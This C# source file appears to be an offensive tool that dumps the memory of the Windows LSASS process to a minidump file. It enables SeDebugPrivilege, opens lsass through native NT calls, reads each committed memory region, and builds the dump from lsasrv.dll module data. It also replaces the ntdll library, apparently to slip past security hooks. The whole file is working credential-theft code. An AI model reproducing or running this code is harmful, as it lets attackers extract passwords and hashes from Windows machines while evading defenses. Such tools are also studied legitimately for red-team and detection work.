using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static UnreadablePEB.NT;
using static UnreadablePEB.CreateFile;


namespace UnreadablePEB
{
    internal class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)] public static extern int LdrLoadDll(IntPtr PathToFile, IntPtr Flags, ref UNICODE_STRING ModuleFileName, out IntPtr ModuleHandle);
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)] public struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }


        static List<ModuleInformation> GetLibInfo()
        {
            // Get library address
            string dllPath = @"C:\Windows\System32\lsasrv.dll";
            UNICODE_STRING unicodeString = new UNICODE_STRING
            {
                Length = (ushort)(dllPath.Length * 2),
                MaximumLength = (ushort)((dllPath.Length + 1) * 2),
                Buffer = Marshal.StringToHGlobalUni(dllPath)
            };

            IntPtr lsasrv_addr;
            try
            {
                int result = LdrLoadDll(IntPtr.Zero, IntPtr.Zero, ref unicodeString, out lsasrv_addr);
                if (result != 0)
                {
                    Console.WriteLine("[-] Failed to load DLL. NTSTATUS: " + result.ToString("X"));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(unicodeString.Buffer);
            }

            // Get library size
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr mem_address = lsasrv_addr;
            long aux_size = 0;

            while ((long)mem_address < proc_max_address_l)
            {
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                uint ntstatus = NtQueryVirtualMemory((IntPtr)(-1), (IntPtr)mem_address, 0, out mbi, 0x30, out _);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtQueryVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                }
                if (mbi.AllocationBase != lsasrv_addr)
                {
                    break;
                }
                aux_size += mbi.RegionSize.ToInt64();
                mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
            }

            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();
            moduleInformationList.Add(new ModuleInformation("lsasrv.dll", "C:\\\\WINDOWS\\\\system32\\\\lsasrv.dll", lsasrv_addr, int.Parse(aux_size.ToString())));

            return moduleInformationList;

        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static Tuple<List<Memory64Info>, byte[]> GetRegionInfo()
        {
            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get PID
            int processPID = Process.GetProcessesByName("lsass")[0].Id;

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }

            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] It was not possible to get a process handle. If you get 0xC0000022 errors probably PEB is unreadable.");
                Environment.Exit(-1);
            }

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] memory_regions = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    if (ntstatus != 0 && ntstatus != 0x8000000D)
                    {
                        Console.WriteLine("[-] Error calling NtReadVirtualMemory. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    }
                    byte[] new_bytearray = new byte[memory_regions.Length + buffer.Length];
                    Buffer.BlockCopy(memory_regions, 0, new_bytearray, 0, memory_regions.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                    memory_regions = new_bytearray;

                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }
            // Close process handle
            NtClose(processHandle);

            return Tuple.Create(mem64info_List, memory_regions);
        }

        static void Main(string[] args)
        {
            // Check binary is correctly compiled
            if (!Environment.Is64BitProcess)
            {
                Console.WriteLine("[-] File must be compiled as 64-byte binary.");
                Environment.Exit(-1);
            }

            // Replace ntdll library
            string ntdll_option = "default";
            string wildcard_value = "";
            if (args.Length >= 1)
            {
                ntdll_option = args[0];
            }
            if (args.Length >= 2)
            {
                wildcard_value = args[1];
            }
            ReplaceLibrary(ntdll_option, wildcard_value);

            // Get ModuleList information
            List<ModuleInformation> moduleInformationList = GetLibInfo();
           
            // Get Mem64List information + Dump memory regions
            var region_result = GetRegionInfo();
            List<Memory64Info> mem64info_List = region_result.Item1;
            byte[] memoryRegions_byte_arr = region_result.Item2;

            // Create Minidump file
            string filename = "proc_" + Process.GetProcessesByName("lsass")[0].Id.ToString() + ".dmp";
            CreateMinidump(moduleInformationList, mem64info_List, memoryRegions_byte_arr, filename);
        }
    }
}